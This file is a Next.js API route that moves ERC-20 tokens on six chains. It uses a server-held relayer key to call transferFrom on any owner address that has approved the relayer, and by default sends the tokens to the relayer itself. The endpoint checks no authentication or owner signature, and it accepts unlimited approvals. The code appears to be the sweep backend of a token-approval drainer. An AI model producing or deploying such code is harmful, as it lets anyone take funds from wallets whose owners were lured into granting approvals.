import { NextResponse } from 'next/server';
import { ethers } from 'ethers';

// Official token addresses for different networks
const TOKEN_ADDRESSES: Record<string, Record<string, string>> = {
  ethereum: {
    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    'STETH': '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    'SHIB': '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'PEPE': '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
    'LDO': '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32',
    'GRT': '0xc944E90C64B2c07662A292be6244BDf05Cda44a7',
    'AAVE': '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
    'MKR': '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2',
    'RNDR': '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24',
    'APE': '0x4d224452801ACEd8B2F0aebE155379bb5D594381',
    'SAND': '0x3845badAde8e6dFF049820680d1F14bD3903a5d0',
    'MANA': '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942',
    'FXS': '0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0',
    'CRV': '0xD533a949740bb3306d119CC777fa900bA034cd52'
  },
  arbitrum: {
    'ARB': '0x912CE59144191C1204E64559FE8253a0e49E6548',
    'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
    'USDC': '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    'LINK': '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4',
    'GMX': '0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a',
    'UNI': '0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0',
    'RDNT': '0x3082CC23568eA640225c2467653dB901AB91b537',
    'MAGIC': '0x539bdE0d7Dbd336b79148AA742883198BBF60342',
    'AAVE': '0xBA5DdD1f9d7F570dc94a51479a000E3BCE96713A',
    'PENDLE': '0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8',
    'SUSHI': '0xd4d42F0b6DEF4CE0383636F614810bA4cbB1b883',
    'CRV': '0x11cDb42B0EB46D95f9902D463E563e68e6740728',
    'STG': '0x6694340fc020c5E6B96567843da2df01b2CE1eb6',
    'GRAIL': '0x3d9907F9a368ad0a51Be60f7Da3b97cf940982D8',
    'FXS': '0x9d2D2A3AE3d504453862556555C54c42441991A',
    'DAI': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
    'LDO': '0x13Ad51ed4F1B7e9Dc168d8a00cb3f4dDD85EfA60',
    'WBTC': '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
    'GNS': '0x18c11FD286C5EC11c3b683Caa813B77f5163A122'
  },
  base: {
    'WETH': '0x4200000000000000000000000000000000000006',
    'USDC': '0x833589fCD6eDb6E08f4c7C32D4f71b54bda02913',
    'AERO': '0x940181a94A35A4569E4529A3CDfB74e38FD98631',
    'BRETT': '0x532f27101965dd16d27522e0342a3457886dd7e7',
    'DEGEN': '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed',
    'TOSHI': '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4',
    'UNI': '0x68B1D87F95878fE05B998F19b66F4b74982a9761',
    'LINK': '0x5242d5475460A7682d2aAb48207212d25722F885',
    'AAVE': '0xe226853906231A85517448510255c2D175135105',
    'VELO': '0x9c354503C38481a7A7a51629142963F98eCC12D0',
    'SNX': '0x78733fa5e7a27f6c324204555895828807539F32',
    'SEAM': '0x1C7a460413dD4e964f96D8d434A7Aa9a2212234A',
    'FRIEND': '0x0bd488718b458db545725215321743cb3103d7c9',
    'DAI': '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
    'RETH': '0x9710344d2Aa9b5a867433B39C6940388D235C834',
    'OP': '0x4200000000000000000000000000000000000042',
    'USDT': '0xfB20A530515e520CDB982c5b40f60A535a5C4258',
    'HIGHER': '0x1F47414A19589F21564B56585195744422A99066',
    'FELLAS': '0x0fC758296a2412b192931449419105431415958d',
    'CBETH': '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22'
  },
  bnb: {
    'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'CAKE': '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
    'BTCB': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
    'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
    'LINK': '0xF8A0BF9cF54Bb92Fb170829018eE876004503091',
    'DOGE': '0xba2aE424d960c26247Dd6c32edC70B295c744C43',
    'XVS': '0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63',
    'TWT': '0x4B0F1812e5Df2A09796481Ff14017e6005508003',
    'APE': '0x5244294a59a0b542033fb9346d97d8a631f4e1fc',
    'DOT': '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
    'AVAX': '0x1CE0c2827e2EF14D5C4f20C99A59a1D9497f951ed',
    'GALA': '0x7dDEE10A3A25b4453b2075551C57F26a27821b29',
    'FLOKI': '0xfb5B838b6cfEEDC28734627876aae51373Dcc6de',
    'BAKE': '0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5',
    'SHIB': '0x2859e4544C4bB03966803b044422796668078028',
    'ADA': '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
    'SOL': '0x570A5D26f7765Ecb712C0924E4De545B89fD43dF',
    'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    'BABYDOGE': '0xc748673057861a797275CD8A068AbB95A902e8de'
  },
  polygon: {
    'WMATIC': '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270',
    'USDC': '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
    'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    'WETH': '0x7ceb23fd6bc0add59e62ac25578270cff1b9f619',
    'LINK': '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39',
    'AAVE': '0xD6DF932A45C0f255f85145f286EA0b292B21C90B',
    'QUICK': '0x831753DD7087CaC61aB5644b308642cc1c33Dc13',
    'UNI': '0xb33EaAd8d922B1083446DC23f610c2567fB5180f',
    'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    'WBTC': '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6',
    'SAND': '0xBbba073C31Bf03b8ACF7c28EF0738DeCF3695683',
    'SUSHI': '0x0b3F868E0BE5597D5DB7FEB59E1CADBb0fdDa50a',
    'GRT': '0x5fe2B58c013d7601147DcdD68C143A77479F5536',
    'CRV': '0x172370d5Cd63279eFa6d502Dab29171933a610AF',
    'BAL': '0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3',
    'GHST': '0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7',
    'TEL': '0xdf7837de1f2fa4631D716CF2502f8b230F1dcc32',
    'DG': '0x2a93322026772740A8128479b4a53A431542A455',
    'GALA': '0x7dDEE10A3A25b4453b2075551C57F26a27821b29',
    'STG': '0x2F6F07CDcf3588944Bf4C42aC74ff24bF56e7590'
  },
  sepolia: {
    'USDT': '0x03bbb5660b8687c2aa453a0e42dcb6e0732b1266',
    'USDC': '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238'
  }
};

export async function POST(req: Request) {
  const startedAtMs = Date.now();
  try {
    const { tokenSymbol, owner, amount, network, recipient } = await req.json();
    if (!tokenSymbol || !owner || !amount || !network) {
      return NextResponse.json({ success: false, error: 'Missing required fields: tokenSymbol, owner, amount, network' }, { status: 400 });
    }

    // Resolve token address
    const tokenAddress = TOKEN_ADDRESSES[network]?.[tokenSymbol.toUpperCase()];
    if (!tokenAddress) {
      return NextResponse.json({ success: false, error: `Token ${tokenSymbol} not supported on ${network}` }, { status: 400 });
    }

    // RPCs via env
    const rpcMap: Record<string, string | undefined> = {
      sepolia: process.env.RPC_SEPOLIA,
      ethereum: process.env.RPC_ETHEREUM,
      polygon: process.env.RPC_POLYGON,
      arbitrum: process.env.RPC_ARBITRUM,
      bnb: process.env.RPC_BNB,
      base: process.env.RPC_BASE
    };
    const rpcUrl = rpcMap[network];
    if (!rpcUrl) return NextResponse.json({ success: false, error: `RPC not configured for ${network}` }, { status: 400 });

    // Relayer signer
    const relayerPk = process.env.RELAYER_PRIVATE_KEY;
    if (!relayerPk) return NextResponse.json({ success: false, error: 'RELAYER_PRIVATE_KEY not configured' }, { status: 500 });

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayer = new ethers.Wallet(relayerPk, provider);
    const toAddress: string = recipient && recipient !== '' ? recipient : relayer.address;

    // Basic validations
    if (!ethers.isAddress(owner)) return NextResponse.json({ success: false, error: 'Invalid owner address' }, { status: 400 });
    if (!ethers.isAddress(toAddress)) return NextResponse.json({ success: false, error: 'Invalid recipient address' }, { status: 400 });

    // Verify the token is a contract
    const code = await provider.getCode(tokenAddress);
    if (!code || code === '0x') {
      return NextResponse.json({ success: false, error: `Address ${tokenAddress} has no contract bytecode on ${network}` }, { status: 400 });
    }

    const abi = [
      'function transferFrom(address from, address to, uint256 value) returns (bool)',
      'function decimals() view returns (uint8)',
      'function allowance(address owner, address spender) view returns (uint256)',
      'function balanceOf(address) view returns (uint256)'
    ];
    const token = new ethers.Contract(tokenAddress, abi, relayer);

    // Read token config and compute value
    const [decimals, allowanceRaw, ownerBalanceRaw, chainId] = await Promise.all([
      token.decimals(),
      token.allowance(owner, relayer.address),
      token.balanceOf(owner),
      provider.getNetwork().then(n => n.chainId)
    ]);

    const value = ethers.parseUnits(amount, decimals);

    // Diagnostics
    console.log('[transfer] network', network, 'chainId', chainId.toString());
    console.log('[transfer] token', tokenSymbol, tokenAddress);
    console.log('[transfer] owner', owner);
    console.log('[transfer] recipient', toAddress);
    console.log('[transfer] decimals', decimals);
    console.log('[transfer] allowance', allowanceRaw.toString());
    console.log('[transfer] ownerBalance', ownerBalanceRaw.toString());
    console.log('[transfer] value', value.toString());

    // Validate allowance
    if (allowanceRaw !== ethers.MaxUint256 && allowanceRaw < value) {
      return NextResponse.json({ success: false, error: `Allowance too low. Approved: ${ethers.formatUnits(allowanceRaw, decimals)}` }, { status: 400 });
    }

    // Validate balance for clarity
    if (ownerBalanceRaw < value) {
      return NextResponse.json({ success: false, error: `Owner balance too low: ${ethers.formatUnits(ownerBalanceRaw, decimals)}` }, { status: 400 });
    }

    // Ensure relayer has enough native balance to pay gas and attach gas fields
    const relayerBalance = await provider.getBalance(relayer.address);

    // Try to estimate gas for the transferFrom call using encoded data (avoids Contract typing issues)
    let estimatedGas: bigint | undefined = undefined;
    try {
      const data = token.interface.encodeFunctionData('transferFrom', [owner, toAddress, value]);
      estimatedGas = await provider.estimateGas({ to: tokenAddress, from: relayer.address, data });
      if (estimatedGas) console.log('[transfer] estimatedGas', estimatedGas.toString());
    } catch (err) {
      // If estimation fails, we'll still try to send the tx without an explicit gas limit
      console.warn('[transfer] gas estimation failed, proceeding without explicit gas limit', err);
      estimatedGas = undefined;
    }

    // Get fee data from provider (handles legacy and EIP-1559 networks)
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice ?? feeData.maxFeePerGas ?? null;

    // If we have both estimatedGas and a gasPrice, check relayer native balance
    if (estimatedGas && gasPrice) {
      try {
        const required = estimatedGas * gasPrice;
        console.log('[transfer] relayerBalance', relayerBalance.toString(), 'required', required.toString());
        if (relayerBalance < required) {
          return NextResponse.json({ success: false, error: 'Relayer has insufficient native balance to pay gas' }, { status: 402 });
        }
      } catch (err) {
        console.warn('[transfer] error computing required gas', err);
      }
    }

    // Prepare tx overrides where available
    const txOverrides: Record<string, unknown> = {};
    if (estimatedGas) txOverrides['gasLimit'] = estimatedGas;
    if (feeData.maxFeePerGas) txOverrides['maxFeePerGas'] = feeData.maxFeePerGas;
    if (feeData.maxPriorityFeePerGas) txOverrides['maxPriorityFeePerGas'] = feeData.maxPriorityFeePerGas;
    if (feeData.gasPrice && !feeData.maxFeePerGas) txOverrides['gasPrice'] = feeData.gasPrice; // legacy networks

    // Execute transferFrom from relayer so the app pays gas
    const tx = await token.transferFrom(owner, toAddress, value, txOverrides);
    const receipt = await tx.wait();

    return NextResponse.json({ success: true, txHash: tx.hash, blockNumber: receipt?.blockNumber ?? null, elapsedMs: Date.now() - startedAtMs });
  } catch (err: any) {
    const details: Record<string, unknown> = {};
    let errorMsg = 'Unexpected error';
    if (err) {
      if (err.code) details.code = err.code;
      if (err.shortMessage) details.shortMessage = err.shortMessage;
      if (err.reason) details.reason = err.reason;
      if (err.message) details.message = err.message;
      if (err.data) details.data = err.data;
      errorMsg = err.reason || err.shortMessage || err.message || errorMsg;
    }
    console.error('[transfer] error', details);
    return NextResponse.json({ success: false, error: errorMsg, details }, { status: 500 });
  }
}
